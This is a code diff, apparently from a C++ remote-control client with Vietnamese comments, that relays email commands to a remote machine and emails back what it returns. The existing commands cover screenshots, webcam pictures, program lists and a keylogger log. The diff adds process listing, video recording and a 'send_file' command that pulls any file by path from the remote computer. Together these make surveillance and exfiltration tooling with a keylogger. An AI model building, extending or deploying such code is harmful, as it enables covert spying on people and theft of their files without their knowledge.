@@ -69,6 +69,9 @@ std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
     {"get_screenshot", {"Screenshot from server", saveDir + "screenshot.png"}},
     {"get_picture", {"Picture from server", saveDir + "picture.png"}},
     {"list_program", {"Program list from server", saveDir + "programs.txt"}},
+    {"list_process", {"Process list from server", saveDir + "processes.txt"}},
+    {"get_recording",
+     {"Video recording from server", saveDir + "recording.avi"}},
     {"keylogger", {"Keylogger log from server", saveDir + "keylog.txt"}}};
 
 void signal_handler(int) { running.store(false); }
@@ -84,9 +87,28 @@ void process_command(const std::string &command,
   std::string payload = senderEmail + "\n" + command;
   send(sock, payload.c_str(), payload.size(), 0);
 
-  if (fileCommands.count(command)) {
+  // Xử lý command send_file
+  if (command.find("send_file") == 0) {
+    std::string filepath = command.substr(9);  // Bỏ "send_file "
+    // Trim spaces
+    filepath.erase(filepath.begin(),
+                   find_if(filepath.begin(), filepath.end(),
+                           [](int ch) { return !isspace(ch); }));
+
+    if (!filepath.empty()) {
+      // Lấy tên file từ đường dẫn đầy đủ
+      std::filesystem::path path(filepath);
+      std::string filename = path.filename().string();
+
+      receive_file(sock, filename);
+      send_email_with_attachment(senderEmail, "File from remote computer",
+                                 "Requested file: " + filepath,
+                                 saveDir + filename);
+    }
+  } else if (fileCommands.count(command)) {
     auto [subject, localFile] = fileCommands[command];
-    receive_file(sock, localFile);
+    std::string filename = std::filesystem::path(localFile).filename().string();
+    receive_file(sock, filename);
     send_email_with_attachment(senderEmail, subject,
                                "Requested file from server", localFile);
   }
